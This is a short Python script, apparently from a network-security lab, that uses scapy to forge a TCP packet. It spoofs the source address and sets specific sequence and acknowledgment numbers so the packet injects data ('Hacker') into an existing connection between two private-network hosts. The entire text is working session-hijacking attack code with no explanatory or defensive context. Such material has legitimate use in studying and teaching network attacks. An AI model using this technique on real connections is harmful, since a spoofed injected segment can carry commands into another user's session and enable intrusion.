from scapy.all import *
ip = IP(src="192.168.220.133", dst="192.168.220.132")
tcp = TCP(sport=58348, dport=9999, flags="PA", seq=985916311, ack=893784809)
packet = ip/ tcp/ "Hacker"
send(packet)
